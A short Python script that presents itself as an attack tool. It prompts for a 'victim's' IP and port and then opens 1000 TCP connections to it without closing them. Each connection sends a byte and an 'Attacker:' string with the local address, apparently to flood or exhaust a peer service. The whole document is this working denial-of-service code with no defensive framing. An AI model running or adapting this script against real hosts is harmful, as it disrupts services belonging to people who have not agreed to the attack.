import socket, sys, os, time
my_ip = os.popen('ip addr show wlp2s0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
my_port = 2001

print("Input your victim's ip:port: ", end="")
ip, port = tuple(str(input()).strip().split(':'))
print('Attacking ', ip + ':' + port)
for i in range(1000):
    print("Attack #{}".format(i))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 10)
    s.connect((ip, int(port)))
    s.send(bytes([1]))
    s.send(("Attacker:" + my_ip + ":" + str(my_port)).encode())
    # s.close()
    # time.sleep(1)
